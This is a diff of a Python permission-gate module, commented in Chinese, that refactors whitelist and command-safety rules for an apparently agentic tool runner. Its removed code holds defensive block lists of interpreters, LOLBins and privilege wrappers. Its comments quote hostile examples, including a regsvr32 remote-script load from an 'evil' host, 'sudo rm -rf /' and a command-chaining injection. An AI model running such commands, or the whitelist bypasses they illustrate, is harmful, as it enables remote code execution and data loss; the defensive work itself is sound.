@@ -29,10 +29,7 @@ r"""Permission Gate：敏感操作确认与白名单。
 from __future__ import annotations
 
 import asyncio
-import difflib
 import fnmatch
-import os
-import shlex
 import uuid
 from collections.abc import Awaitable, Callable, Iterable
 from dataclasses import dataclass, field
@@ -42,303 +39,49 @@ from typing import TYPE_CHECKING
 from .. import obs
 from ..tools.base import Safety, Tool
 from . import leases
+from .command_rules import (  # noqa: F401 - 保留再导出供既有调用与测试定位
+    _CASE_INSENSITIVE_FS,
+    _CHAIN_EXPAND_CHARS,
+    _CHAIN_SEP_CHARS,
+    _CODE_EXEC_FLAGS,
+    _INTERPRETER_COMMANDS,
+    _INTERPRETER_EXTRA_FLAGS,
+    _INTERPRETER_SCAN_MAX_TOKENS,
+    _IS_WINDOWS,
+    _POSIX_SHELLS,
+    _PREFIX_DELETE_HEADS,
+    _PREFIX_EXEC_PAIRS,
+    _PREFIX_UNSAFE_COMMANDS,
+    _RUN_COMMAND,
+    _SUDO_WRAPPERS,
+    _WRAPPER_COMMANDS,
+    _WRAPPER_VALUE_OPTS,
+    RULE_KINDS,
+    _all_assignment_words,
+    _chain_hint,
+    _first_real_command_word,
+    _has_code_exec_flag,
+    _has_extra_flag_after_script,
+    _has_shell_chain,
+    _hits_unsafe_entry_command,
+    _interpreter_invocation,
+    _is_arbitrary_exec_prefix,
+    _is_arbitrary_exec_words,
+    _is_var_assignment,
+    _is_wrapper_duration_token,
+    _norm_exe_name,
+    _prefix_deletes_or_runs_arbitrary,
+    _prefix_match,
+    _sudo_anchor_index,
+    _sudo_prefix_shape_unsafe,
+    _token_hits_code_exec,
+    _tokenize,
+)
 from .decision import Tier, decide
+from .preview import PermissionPreviewMixin
 
 if TYPE_CHECKING:
     from ..session.store import SessionStore
-
-# 以「一条简单命令」为单位的前缀白名单只对 run_command 有意义；命令里出现 shell 元字符
-# （见 _has_shell_chain）就意味着可能存在后续命令或参数替换，必须退回逐次确认。
-_RUN_COMMAND = "run_command"
-
-# 白名单规则的合法类型（设置页手动添加 / 导入时校验；与 WhitelistRule.matches 支持的 kind 对齐）。
-RULE_KINDS = ("always", "prefix", "exact", "glob")
-
-# glob 规则的大小写语义：Windows 文件系统大小写不敏感，规则也按不敏感匹配（与文件查找一致）；
-# 其它平台严格区分。fnmatch.fnmatch 会隐式做这层归一（normcase），行为随平台悄悄变化，
-# 这里显式判断，让规则语义可读、可预期。
-_CASE_INSENSITIVE_FS = os.name == "nt"
-
-# 命令实际交给哪个 shell 执行（见 tools/shell.py：Windows 是 cmd.exe，其它平台是 bash）。
-# 两者的引号与展开语义不同，白名单的「是否有命令拼接」判定必须按平台取，见 _has_shell_chain。
-_IS_WINDOWS = os.name == "nt"
-
-# 两平台都危险的展开/替换字符：POSIX 的变量替换（$VAR）、命令替换（$(...)）与反引号，
-# 以及换行。Windows 的 cmd 不展开 $ 与反引号，但保守拦下没有代价（只是回到逐次确认），
-# 而一旦漏判就是白名单被绕过。
-_CHAIN_EXPAND_CHARS = "`$\r\n"
-
-# 命令分隔/重定向字符。`;` 在 cmd 中并不是分隔符，但它在本表里两平台一并拦下——
-# 纵深防御：命令字符串的解析方未必永远是我们这里指定的 shell，宁可多问一次。
-_CHAIN_SEP_CHARS = ";|&<>"
-
-
-# 「下一参数就是任意代码文本」的解释器/shell 旗标（小写）。规则提炼（rule_for）
-# 与匹配（WhitelistRule._matches_core）共用：这类调用提炼不出有边界的前缀，
-# "python -c" 前缀规则等于放行任意 Python 代码。
-_CODE_EXEC_FLAGS = frozenset({
-    "-c", "-e", "-p", "-r", "-lc", "-ic", "/c", "/k",
-    "-command", "-encodedcommand", "--eval", "--command",
-})
-
-# 解释器调用**全文扫描**时额外识别的「下一参数即任意代码/任意脚本」旗标。
-# 与 _CODE_EXEC_FLAGS 分开：这些词在普通工具里是常见参数（tar -f / curl -f），
-# 只对解释器（_INTERPRETER_COMMANDS）的调用启用，避免把正常命令误伤成 exact。
-# -m：python -m <任意模块>（与 python -c 同级入口，此前漏判）
-# -file/--file/-f：powershell/pwsh 加载任意脚本（-f 是 -File 的官方缩写）
-_INTERPRETER_EXTRA_FLAGS = frozenset({
-    "-m", "-file", "--file", "-f",
-    # deno eval / bun eval：第二词就是子命令，后接任意 JS
-    "eval",
-    # node --require / --import / --loader：脚本名之后仍可加载任意模块执行代码
-    # （`node build.js --require /tmp/evil.js` 与 `node -e <代码>` 等效）
-    "--require", "--import", "--loader",
-})
-
-# 解释器/shell 可执行名（小写）：旗标全文扫描只对以它们开头的命令放开。
-# 这类调用的旗标可以出现在任意位置（`py -3 -X utf8 -c`、
-# `powershell -NoProfile -ExecutionPolicy Bypass -Command` 的旗标都在第 5 词），
-# 只扫前几个词会被用来绕过 prefix/glob 白名单放行任意代码；而 -c/-e 这类词在
-# tar/grep/git 等普通工具里是常见参数，对它们全文扫描会把正常命令大面积
-# 误伤成「只能固化当次参数」。带 .exe 后缀与路径前缀的形态一并识别
-# （两平台都接受这些写法）。
-_INTERPRETER_COMMANDS = frozenset({
-    "python", "python3", "py", "powershell", "pwsh",
-    "node", "deno", "bun", "ruby", "perl",
-    "bash", "sh", "zsh", "fish", "cmd",
-})
-
-# 「第二词之后仍是任意执行/任意文件面」的入口命令（小写）：两词前缀提炼不出
-# 有边界的前缀——`docker run` 之后的参数可挂载宿主盘、跑任意镜像（任意代码），
-# `docker exec/compose/build` 各自都是任意执行面；`ssh host` 之后即任意远程
-# 命令；`scp 本地 目标` 第三词起可任意外传/拉取。与解释器调用（python -c）
-# 同语义：没有安全前缀可提炼，改成 exact 只放行用户当时批准的这一条。
-# 规则提炼（rule_for）与匹配（_matches_core 对历史遗留前缀规则 fail-closed）
-# 共用同一份。kubectl 刻意不入清单：它提炼出的是动词级前缀（`kubectl get
-# pods` → "kubectl get"，放行面 = 同一动词的任意参数），比 docker/ssh 的
-# 「第二词之后即任意执行面」窄，保留两词前缀（apply/exec 等动词仍有变更面，
-# 靠逐次确认兜底——产品拍板的取舍）。带 .exe 后缀与路径前缀的形态一并识别。
-#
-# 对抗性审查补充（前三类此前漏判，已用 rule_for + matches 端到端复现）：
-# - wsl：`wsl -d <distro> <任意命令>` 是任意 Linux 执行面（与 ssh host 同构）；
-# - npx/uvx/bunx：下载并运行任意远程包（与 docker run 同构）；
-# - go/make：`go run <任意 .go>`、`make -f <任意 makefile>` 都是任意代码执行
-#   （此前提炼出 `go run` / `make -f` 两词前缀，批准一次即放行同前缀任意目标）；
-# - LOLBin（regsvr32/certutil/mshta/rundll32）：固定旗标 + 任意 URL/脚本路径
-#   （`regsvr32 /s /u /i:http://evil/x.sct scrobj.dll` 类），旗标本身不代码执行，
-#   但后面参数即任意远程加载面。
-_PREFIX_UNSAFE_COMMANDS = frozenset({
-    "docker", "ssh", "scp",
-    "wsl", "npx", "uvx", "bunx",
-    "go", "make",
-    "regsvr32", "certutil", "mshta", "rundll32",
-    # 提权包装器（F6.1）：sudo/doas 锚定的前缀只有「包装器 + 命令 + 子命令」
-    # 三词形状钉得住（见 _SUDO_WRAPPERS 与 _sudo_prefix_shape_unsafe），其余
-    # 形状（两词收尾、旗标/赋值收尾）等于「以 root 跑任意命令」。_first_real_
-    # command_word 平时把 sudo/doas 当包装器越过（真实命令词落在它后面，
-    # `sudo docker build` 靠这一层拦），清单里收这两个名字是口径兜底：扫描
-    # 一旦把 sudo/doas 当真实命令词交回来，同样按任意执行面 fail-closed。
-    "sudo", "doas",
-})
-
-
-def _norm_exe_name(word: str) -> str:
-    """可执行名归一：小写、去配对引号、去路径前缀、去 .exe 后缀（两平台写法都认）。"""
-    exe = word.lower()
-    # 只剥「首尾成对」的引号：原 strip('"').strip("'") 会连去首尾任意引号字符，
-    # 对 ``python、python" 这类畸形词给出意外结果（审查 A2）。
-    if len(exe) >= 2 and exe[0] == exe[-1] and exe[0] in "\"'":
-        exe = exe[1:-1]
-    exe = exe.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
-    if exe.endswith(".exe"):
-        exe = exe[: -len(".exe")]
-    return exe
-
-
-def _tokenize(text: str) -> list[str]:
-    r"""命令分词：优先 shlex（正确切分带引号/空格的路径，`"C:\Program Files\...\python.exe" -c`
-    不会被空格拆碎），失败退回 str.split。Windows 用 posix=False 保留引号交由
-    _norm_exe_name 配对剥离；POSIX 用 posix=True 由 shlex 去引号。"""
-    try:
-        return shlex.split(text, posix=(not _IS_WINDOWS))
-    except ValueError:
-        return text.split()
-
-
-# 「后面紧跟真实命令」的包装器命令：解释器可被这些前缀挤出首词，只看 words[0]
-# 会把 `env A=1 python -c ...` 误判为非解释器调用而漏掉 code-exec 旗标。
-_WRAPPER_COMMANDS = frozenset({
-    "env", "nohup", "nice", "time", "sudo", "doas", "setsid", "stdbuf",
-    "xargs", "command", "exec", "timeout", "ionice", "chrt",
-})
-
-# 解释器/真实命令词识别的总扫描词数上限：扫描会向后跳过前置赋值、包装器、
-# 选项与数值去找第一个真实命令词，不再有「只看前 N 个 token」的硬截断——
-# 旧实现截 8 个 token，8 个前置赋值即可把解释器推出窗口外（审查 SEC-M01）。
-# 这个上限只是防超长输入拖慢授权路径；上限外按「找不到真实命令词」由调用方
-# fail-closed 处理（提炼侧一律 exact、匹配侧拒绝免确认放行）。
-_INTERPRETER_SCAN_MAX_TOKENS = 64
-
-# 提权包装器：前缀提炼取三词（`sudo apt install` / `sudo apt remove` 各成一类），
-# 不用两词前缀——`sudo apt` 会把 install 与 remove 合并，remove 可卸载关键包。
-# 三词形状由 _sudo_prefix_shape_unsafe 统一把关（提炼与匹配同源，F6.1）：锚在
-# sudo/doas 上却钉不住三个词的（词数不足 / 旗标 / 赋值收尾，含 `FOO=1 sudo`
-# 这类赋值垫前的两词残前缀）一律按任意执行面 fail-closed。
-_SUDO_WRAPPERS = frozenset({"sudo", "doas"})
-
-# 包装器命令的「下一参数是值」旗标（小写，含长短形态）：`sudo -u root python`、
-# `nice -n 10 python` 这类调用里，值（root / 10）不是命令词，扫描时必须跳过，
-# 否则会把它当"非解释器词"提前终止、漏判后面的 python -c（此前已知限制）。
-# 只列会出现在"包装器 + 解释器"前缀里的常见包装器与它们的带值旗标；
-# 未列的包装器（如 `env`）用前置赋值处理，不带值旗标。
-# 值统一按小写比对（`w.lower() in opts`）：判定只看"这个旗标带不带值"，
-# 不区分 -u/-U 这类大小写语义差异——多跳过一个值只会多判 code-exec，方向 fail-closed。
-_WRAPPER_VALUE_OPTS: dict[str, frozenset[str]] = {
-    "sudo": frozenset({
-        "-u", "-g", "-h", "-p", "-c", "-t", "-r",
-        "--user", "--group", "--host", "--prompt", "--close-from",
-        "--role", "--type", "--other-user",
-    }),
-    "doas": frozenset({"-u", "-c"}),
-    "nice": frozenset({"-n", "--adjustment"}),
-    "ionice": frozenset({"-c", "-n", "-p", "-u", "--class", "--classdata"}),
-    "chrt": frozenset({"-p", "-t", "--pid", "--sched-runtime"}),
-    "stdbuf": frozenset({"-i", "-o", "-e", "--input", "--output", "--error"}),
-    "timeout": frozenset({"-s", "-k", "--signal", "--kill-after"}),
-    "time": frozenset({"-f", "-o", "--format", "--output"}),
-    "nohup": frozenset(),
-    "setsid": frozenset(),
-    "command": frozenset(),
-    "exec": frozenset(),
-    "env": frozenset({"-u", "--unset", "-c", "--chdir", "-s", "--split-string"}),
-    "xargs": frozenset({"-n", "-i", "-l", "-p", "-s", "-a", "-d", "-e"}),
-}
-
-
-def _is_var_assignment(word: str) -> bool:
-    """POSIX 前置赋值 `NAME=value`（NAME 是合法标识符）。"""
-    name, sep, _ = word.partition("=")
-    return bool(sep) and name.isidentifier()
-
-
-def _first_real_command_word(words: list[str]) -> str | None:
-    """跳过前置赋值与包装器（含其带值旗标的值、无值旗标、数值），取第一个
-    真实命令词（经 _norm_exe_name 归一）；找不到返回 None。
-
-    「首个真实命令词」是解释器判定与任意执行面守卫的统一锚点：`TAG=latest
-    docker build`、`env docker build`、`sudo -u root python -c` 的首词都不是
-    真实命令，只看 words[0] 的判定会被前置赋值/包装器挤开（审查 SEC-M01）。
-    规则提炼（rule_for）与匹配侧（WhitelistRule._matches_core、
-    _is_arbitrary_exec_prefix）共用本扫描，保证两侧对「这条命令/这条前缀
-    钉住的是哪个真实命令」同一口径。只扫前 _INTERPRETER_SCAN_MAX_TOKENS
-    个词（防超长输入拖慢授权路径），上限外一律视为「找不到」——调用方按
-    fail-closed 处理，绝不把「没看清」当成「无害」。
-    """
-    words = words[:_INTERPRETER_SCAN_MAX_TOKENS]
-    wrapper: str | None = None
-    i = 0
-    while i < len(words):
-        w = words[i]
-        exe = _norm_exe_name(w)
-        if _is_var_assignment(w):
-            i += 1
-            continue
-        if exe in _WRAPPER_COMMANDS:
-            # 允许包装器链（`sudo env X=1 node …`）：后一个覆盖前一个，
-            # 后续按最新包装器的带值旗标表跳过其值
-            wrapper = exe
-            i += 1
-            continue
-        if wrapper is not None:
-            if w.lower() in _WRAPPER_VALUE_OPTS.get(wrapper, frozenset()):
-                i += 2  # 跳过该旗标的值（用户名 / 数值 / 信号名 / 目录）
-                continue
-            if w.startswith("-") or w.isdigit():
-                i += 1  # 其他无值旗标 / 位置数值（如 timeout 的时长）
-                continue
-            return exe  # 非选项、非数值：真实命令词
-        if w.isdigit() or w.startswith("-"):
-            i += 1
-            continue
-        return exe
-    return None
-
-
-def _sudo_anchor_index(words: list[str]) -> int | None:
-    """首个真实命令词是 sudo/doas 时返回它的下标；不是提权包装器返回 None。
-
-    与 _first_real_command_word 同一扫描口径（跳前置赋值、包装器及其带值旗标
-    的值、无值旗标、位置数值），只是要的是「下标」而不是词——提炼三词前缀和
-    匹配侧 fail-closed 判定都要从 sudo 本身往后数三个词。只跳赋值不跳包装器
-    会让 `nohup sudo …` 漏出两道守卫（F6.1 未闭合面）。
-    """
-    words = words[:_INTERPRETER_SCAN_MAX_TOKENS]
-    wrapper: str | None = None
-    i = 0
-    while i < len(words):
-        w = words[i]
-        exe = _norm_exe_name(w)
-        if _is_var_assignment(w):
-            i += 1
-            continue
-        if exe in _SUDO_WRAPPERS:
-            return i  # 找到提权锚，不再把它当普通包装器跳过
-        if exe in _WRAPPER_COMMANDS:
-            wrapper = exe
-            i += 1
-            continue
-        if wrapper is not None:
-            if w.lower() in _WRAPPER_VALUE_OPTS.get(wrapper, frozenset()):
-                i += 2  # 跳过该旗标的值（用户名 / 数值 / 信号名 / 目录）
-                continue
-            if w.startswith("-") or w.isdigit():
-                i += 1
-                continue
-        elif w.isdigit() or w.startswith("-"):
-            i += 1
-            continue
-        return None  # 真实命令词不是 sudo/doas
-    return None
-
-
-def _interpreter_invocation(text: str) -> bool:
-    """命令是否以解释器/shell 调用（带引号、路径前缀、.exe 后缀、前置赋值/包装器均可）。
-
-    仅看首词会被 `env A=1 B=2 C=3 python -c ...` 这类前置赋值/包装器绕过——首词是
-    `env`/`A=1` 而非解释器，_has_code_exec_flag 随即退化为只扫前几个词，`-c`
-    落在窗口外便不判 code-exec（审查 A1）。这里按「取首个真实命令词」判定
-    （与任意执行面守卫同一扫描，见 _first_real_command_word），前置赋值再多
-    也截不掉解释器（审查 SEC-M01：旧实现硬截 8 个 token，8 个前置赋值即可
-    把解释器推出窗口）。方向 fail-closed：宁可多判 code-exec，不多放行。
-
-    包装器的「带值旗标」（`sudo -u root python`、`nice -n 10 python`、`timeout -s
-    KILL 5 python`）按 _WRAPPER_VALUE_OPTS 跳过其值——值（root / 10 / KILL）不是
-    命令词，不能把它当真实命令提前终止扫描。
-    """
-    return _first_real_command_word(_tokenize(text)) in _INTERPRETER_COMMANDS
-
-
-def _has_code_exec_flag(text: str, head: int = 4) -> bool:
-    """命令里是否出现「下一参数就是任意代码文本」的解释器旗标。
-
-    解释器/shell 命令（py / python / powershell / node 等，见
-    _INTERPRETER_COMMANDS）对**全文**扫描——旗标可以出现在任意位置，只扫前
-    几个词会被 ``py -3 -X utf8 -c``、``powershell -NoProfile -ExecutionPolicy
-    Bypass -Command`` 这类旗标在第 4/5 词的形态绕过（prefix/glob 白名单与
-    规则提炼会一起失守）；其余命令保持只看前 ``head`` 个词——``-c`` 等旗标词
-    在普通工具（``tar -c``、``grep -c``、``git commit -c``）里是常见参数，
-    全词扫描会误伤正常命令。
-    """
-    words = _tokenize(text)
-    if _interpreter_invocation(text):
-        # 解释器调用：全文扫描通用旗标 + 解释器专属旗标（-m/-File/-f/eval）
-        for w in words:
-            low = w.lower()
-            if low in _CODE_EXEC_FLAGS or low in _INTERPRETER_EXTRA_FLAGS:
-                return True
-        return False
-    return any(w.lower() in _CODE_EXEC_FLAGS for w in words[:head])
-
 
 # 固定落点写在引擎主目录（~/.skysheep[-instance]）的工具：没有路径参数，
 # 路径判定（write_path_arg → resolve 后比对）看不到落点，只能点名。
@@ -390,254 +133,6 @@ def _write_targets_engine_home(working_dir, tool, input_dict: dict) -> bool:
             continue
         return True
     return False
-
-
-def _has_shell_chain(text: str) -> bool:
-    r"""命令里是否出现 shell 拼接/替换元字符。
-
-    必须按实际执行该命令的 shell 判定（见 tools/shell.py）：Windows 是 ``cmd.exe /c``，
-    其它平台是 ``bash -c``。两边的引号语义并不相同，用一套规则同时套两边会漏判：
-
-    - **单引号**：POSIX 下是字面量引号（内部一切安全），但 ``cmd.exe`` 不认单引号，
-      ``echo ' & whoami`` 里的 ``&`` 照样分隔命令。所以只有 POSIX 才跳过单引号内容。
-    - **双引号**：两平台都会抑制分隔符语义（实测 cmd 中 ``" & whoami"`` 不分割），
-      保留跳过行为；但 ``$`` 与反引号在双引号内仍会展开。
-    - **``%``**：``cmd.exe`` 会做 ``%VAR%`` 环境变量展开，而变量值里可以带分隔符——
-      等于把「参数」变成「命令」，所以 Windows 上 ``%`` 与分隔符同等对待。
-    - **转义符**：POSIX 的 ``\`` 与 cmd.exe 的 ``^`` 都能让「下一字符」失去原语义
-      ——``\'`` 在 bash 里是字面量引号、**不开引号**。判定器若无视它，会把
-      ``git commit -m \' & whoami`` 里的 ``\'`` 当成开引号、跳过后面的 ``&``，
-      而 bash 照样分隔出第二条命令——前缀白名单由此被绕过（审查回归）。这里
-      不完整模拟转义语义，直接把两平台各自的转义符纳入拦截字符集：命中即回退
-      逐次确认。必须分平台：Windows 命令里路径反斜杠极常见不能拦 ``\``；``^``
-      在 Windows 命令里罕见，拦下代价只是多一次确认。两个方向都只造成额外
-      确认，不造成漏判。POSIX 单引号内的 ``\`` 仍是纯字面量、照旧跳过——
-      它改变不了引号状态。
-    """
-    single = False
-    double = False
-    # 转义符在调用时按 _IS_WINDOWS 现取（测试会打桩该模块全局），不做导入期常量
-    escape = "^" if _IS_WINDOWS else "\\"
-    # cmd.exe 的 %VAR% 展开必须成对：孤立一个 %（echo 100%）不会展开，按拼接
-    # 拦下只是噪音（审查 A3）。% 出现 >= 2 次才可能构成展开，此时才纳入拦截。
-    pct_active = _IS_WINDOWS and text.count("%") >= 2
-    for ch in text:
-        if ch == '"' and not single:
-            double = not double
-            continue
-        if ch == "'" and not double:
-            # POSIX：单引号开合，内部是字面量；cmd.exe 不认单引号，其内容照常参与判定
-            if not _IS_WINDOWS:
-                single = not single
-            continue
-        if single:
-            continue
-        if ch in _CHAIN_EXPAND_CHARS or (pct_active and ch == "%") or ch == escape:
-            return True
-        if double:
-            continue
-        if ch in _CHAIN_SEP_CHARS:
-            return True
-    return False
-
-
-def _chain_hint() -> str:
-    """确认弹窗/测试器里解释「为什么这条命令没命中前缀规则」时用的字符集说明。
-
-    与 _has_shell_chain 的实际判定保持一致：Windows 上额外包含单引号（cmd 不认它）、
-    环境变量展开与脱字符转义；POSIX 上额外包含反斜杠转义；两平台都列出 ``;``
-    （纵深防御，见 _CHAIN_SEP_CHARS）。
-    """
-    base = "; | & < > ` $ 或换行"
-    if _IS_WINDOWS:
-        return base + "，以及单引号 '、%VAR% 变量展开、^ 转义"
-    return base + "，以及反斜杠 \\ 转义"
-
-
-def _has_extra_flag_after_script(text: str) -> bool:
-    """解释器调用是否在"脚本名"之后又带了额外 - 旗标。
-
-    用户批准的 `python manage.py runserver` / `bash setup.sh` 是"运行这个脚本"；
-    之后追加的 - 旗标会改变解释器行为、可能引入额外代码（`bash setup.sh --evil`、
-    `node build.js --require /tmp/x`——后者已由 _INTERPRETER_EXTRA_FLAGS 覆盖，
-    这里兜住其余未列举的旗标面）。命中即退回逐次确认，方向 fail-closed。
-
-    只看第 3 词起：第 1 词是解释器、第 2 词是脚本名/子命令，这两词本身以 -
-    开头的情况（`python -m`）已由 _has_code_exec_flag 负责。
-    """
-    if not _interpreter_invocation(text):
-        return False
-    words = _tokenize(text)
-    if len(words) < 3:
-        return False
-    return any(w.startswith("-") and not w.isdigit() for w in words[2:])
-
-
-def _prefix_match(text: str, pattern: str) -> bool:
-    """前缀命中，且前缀必须是**完整的词**。
-
-    ``git status`` 不该放行 ``git statusx``；动作型工具同理（``click`` 不该放行
-    ``clickx``）。空 pattern 视为无效规则——历史脏数据不该变成「整个工具放行」。
-    """
-    if not pattern or not text.startswith(pattern):
-        return False
-    rest = text[len(pattern) :]
-    return rest[:1] in ("", " ", "\t")
-
-
-# 模板运行级前缀通道额外拒绝的命令族（审查 finding 3）：两词前缀等于
-# 「该命令族的任意参数」，以下命令族要么本身就是删除面（rm/del/rmdir…），
-# 要么第二词之后可执行任意子命令 / 解包任意归档（find/xargs/tar/npm run…）。
-# 手建白名单仍沿既有语义（用户逐条批准）；这里只收窄模板的「本次运行免确认」
-# 通道，与 delete_file 的 DANGEROUS 永不自动放行保持同一安全预期。
-_PREFIX_DELETE_HEADS = frozenset({
-    "rm", "rmdir", "del", "erase", "rd", "unlink", "shred",
-    "deltree", "sdelete", "srm", "wipe", "truncate",
-    "taskkill", "find", "xargs", "forfiles", "unzip", "tar",
-})
-_PREFIX_EXEC_PAIRS = frozenset({
-    ("git", "clean"), ("git", "rm"),
-    ("npm", "run"), ("npm", "exec"), ("npm", "test"),
-    ("npm", "start"), ("npm", "install"), ("npm", "ci"),
-    ("yarn", "run"), ("yarn", "install"),
-    ("pnpm", "run"), ("pnpm", "install"),
-    ("bun", "run"), ("cargo", "run"), ("dotnet", "run"),
-})
-# 已知口径遗留（复查确认，预先存在、非本轮回归）：pip install / uv pip install
-# 等同样可经 setup.py / 构建钩子执行任意代码的安装器不在清单内，其两词前缀的
-# 沉淀与历史规则匹配暂未收窄。本清单为提炼（rule_for）、匹配（_matches_core）
-# 与模板通道（GrantedGate._prefix_usable / collab_templates）四方共用，扩清单
-# 必须一次同步、避免任一通道口径漂移；按「只收窄清单点名的危险族」纪律，
-# 未点名的安装器留待后续统一扩清单时一并处理。
-
-
-def _prefix_deletes_or_runs_arbitrary(pattern: str) -> bool:
-    """前缀是否落在删除 / 任意子命令执行族（模板前缀通道专用）。
-
-    按**首个真实命令词**判定（跳过前置赋值与 env/nohup/timeout/xargs 等包装器，
-    与 rule_for / 匹配侧同一扫描）；只有包装器、找不到真实命令词的前缀
-    （``timeout 5``）同样视为任意命令面。``find``/``xargs``/``tar`` 这类
-    后续参数可执行或解包任意内容的命令整族拒绝，不做旗标级猜测。
-    """
-    words = [w for w in _tokenize(pattern) if w]
-    if not words:
-        return False
-    real = _first_real_command_word(words)
-    if real is None:
-        return True
-    idx = next(
-        (i for i, w in enumerate(words) if _norm_exe_name(w) == real), None
-    )
-    if idx is None:
-        return True
-    rest = words[idx + 1:]
-    if real in _PREFIX_DELETE_HEADS:
-        return True
-    second = str(rest[0]).lower() if rest else ""
-    return (real, second) in _PREFIX_EXEC_PAIRS
-
-
-def _all_assignment_words(pattern: str) -> bool:
-    """前缀是否为纯前置赋值序列（``action=read`` 这类动作语义文本，审查 P-9）。
-
-    动作分支沉淀的语义前缀不是 shell 命令行，``_first_real_command_word``
-    在其上找不到真实命令词，会让 _prefix_deletes_or_runs_arbitrary 按
-    「找不到真实命令词 = 任意命令面」判真；匹配侧（WhitelistRule._matches_core）
-    套用执行族清单时沿用 _is_arbitrary_exec_words 的既有豁免口径——纯赋值
-    序列不算命令面，由动作分支单独沉淀，不进本判定。
-    """
-    words = [w for w in pattern.split() if w]
-    return bool(words) and all(_is_var_assignment(w) for w in words)
-
-
-def _sudo_prefix_shape_unsafe(words: list[str]) -> bool:
-    """锚在提权包装器（sudo/doas）上的词序列钉不住可信三词 → True（F6.1）。
-
-    提权前缀只有「包装器 + 命令 + 子命令」三词形状有边界（`sudo apt install`
-    与 `sudo apt remove` 各成一类，见 _SUDO_WRAPPERS）；其余形状——词数不足
-    （`sudo apt`）、旗标收尾（`sudo rm -rf /`、`sudo -u root …`）、赋值收尾
-    （`sudo env FOO=1 …`，真实命令还没出现）——实质都是「以 root 跑任意命令」。
-    提炼与匹配两侧一律按任意执行面 fail-closed：提炼侧只固化 exact，匹配侧把
-    这类形状的前缀规则（含历史沉淀的 `FOO=1 sudo`、`sudo rm`，手工建的裸
-    `sudo`）全部判死，回落逐次确认。
-
-    锚定口径与 rule_for 的提炼分支一致：跳前置赋值与包装器（含 `nohup` /
-    `timeout` / `xargs` 及其带值旗标/数值），定位首个真实命令词是否为
-    sudo/doas；锚词经 _norm_exe_name 归一（路径前缀 / .exe 后缀 / 成对引号，
-    两平台写法都认）。非 sudo/doas 锚（含全赋值序列）返回 False，由调用方的
-    其他守卫处理。
-    """
-    lead = _sudo_anchor_index(words)
-    if lead is None:
-        return False
-    if lead + 2 >= len(words):
-        return True  # 词数不足：`sudo apt` / `nohup sudo` 钉不住子命令
-    if words[lead + 1].startswith("-") or _is_var_assignment(words[lead + 1]):
-        return True  # 旗标/赋值收尾：`sudo -u root …` / `sudo FOO=1 …`
-    if words[lead + 2].startswith("-") or _is_var_assignment(words[lead + 2]):
-        return True  # 第三词收在旗标/赋值上：`sudo rm -rf /` / `sudo env FOO=1 …`
-    return False
-
-
-def _is_arbitrary_exec_words(words: list[str]) -> bool:
-    """词序列是否落在任意执行面：首个真实命令词在入口清单
-    （_PREFIX_UNSAFE_COMMANDS）内，或提权锚（sudo/doas）钉不住三词形状。
-
-    找不到真实命令词时按两分处理（审查 SEC-M01）：自然扫完（全是前置赋值或
-    包装器收尾，如动作语义文本 `action=read`）不算——这类模式钉不住命令，
-    由匹配侧对**本次命令**的真实命令词检查兜住；但「扫描上限截断」（超长
-    前置赋值链把真实命令推到上限外）必须 fail-closed 判是，否则解释器或
-    入口命令可被推到上限外绕过守卫。
-    F6.1：sudo/doas 锚定且钉不住三词的形状无条件判是——`FOO=1 sudo` 这类
-    历史两词残前缀会把 `FOO=1 sudo rm -rf /` 一并放行，不得借「扫完了、
-    没找到真实命令词」漏判。
-    """
-    real = _first_real_command_word(words)
-    if real is not None:
-        if real in _PREFIX_UNSAFE_COMMANDS:
-            return True
-        return _sudo_prefix_shape_unsafe(words)
-    # 扫完了却没有真实命令词，且序列里有包装器：`nohup` / `timeout 10` /
-    # `xargs sudo` 这类前缀本身不钉任何命令，其后接什么都能命中——按任意
-    # 执行面判死。纯赋值序列（`action=read` 这类动作语义文本）不算：它们
-    # 不是 shell 命令行，由动作分支单独沉淀，不能误伤。
-    if any(_norm_exe_name(w) in _WRAPPER_COMMANDS for w in words):
-        return True
-    if _sudo_prefix_shape_unsafe(words):
-        return True
-    return len(words) > _INTERPRETER_SCAN_MAX_TOKENS
-
-
-def _is_arbitrary_exec_prefix(pattern: str) -> bool:
-    """前缀规则钉住的**首个真实命令词**是否属于「之后即任意执行面」的入口命令。
-
-    用于匹配侧 fail-closed：提炼侧已不再为 docker/ssh/scp 产两词前缀，
-    历史遗留的这类前缀规则一并失效（与 delete_file 的 always 规则失效同一
-    口径），命中判定回落逐次确认。判定对象是真实命令词而非首词（审查
-    SEC-M01）：历史沉淀的 "TAG=latest docker"、手工建的 "env docker" 首词是
-    赋值/包装器，只看 words[0] 认不出来，规则照常免确认放行其后的
-    `docker run`——按真实命令词判定后这类存量规则一律失效。
-
-    分词用 str.split 而非 _tokenize：POSIX 的 shlex 会把 `C:\\Tools\\docker.exe`
-    里的反斜杠当转义吃掉、归一不出 docker，设置页失效标记（backend 的
-    _stale_fields 转发本判定）会漏标；split 保留原词交给 _norm_exe_name。
-    空 pattern 不算命中——空模式本就匹配不了任何命令（_prefix_match）。
-    """
-    return _is_arbitrary_exec_words(pattern.split())
-
-
-def _hits_unsafe_entry_command(text: str) -> bool:
-    """本次命令是否落在任意执行面：首个真实命令词在入口清单内，或提权锚
-    （sudo/doas）钉不住三词形状（匹配侧，SEC-M01 / F6.1）。
-
-    与提炼侧（rule_for）同一清单、同一扫描（分词走 _tokenize，与
-    _has_code_exec_flag 对命令文本同口径）：前置赋值/包装器把 docker/make/go
-    挤出首词的命令（`TAG=latest docker run …`），不得借「首词无害」的
-    前缀规则免确认放行；sudo/doas 锚定但钉不住三词的命令（`sudo rm -rf /`、
-    `FOO=1 sudo …` 残形状）同样不得借任何前缀规则免确认放行。
-    """
-    return _is_arbitrary_exec_words(_tokenize(text))
-
 
 # 出站扫描收集参数字符串的规模上限：防大参数（长文件内容、大 JSON、深嵌套）
 # 拖慢授权路径。上限外的值按「未扫描」处理——防线只许漏、不许瘫（漏掉的
@@ -820,7 +315,7 @@ class PendingPermission:
         return await self._future
 
 
-class PermissionGate:
+class PermissionGate(PermissionPreviewMixin):
     """每次会话创建一个实例；持有项目/会话白名单规则。"""
 
     def __init__(
@@ -1058,6 +553,7 @@ class PermissionGate:
                 # 提炼不出前缀，同样只能固化当次参数，否则会退化成「整个工具放行」。
                 return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
             words = arg_text.split()
+            tokens = _tokenize(arg_text)
             if str(input_dict.get("action", "") or "run") != "run":
                 # action=read/kill/list（审查 P-9）：语义文本是动作编码、不是 shell
                 # 命令行，不进命令词法分析——按动作粒度沉淀前缀，与鼠标/键盘的
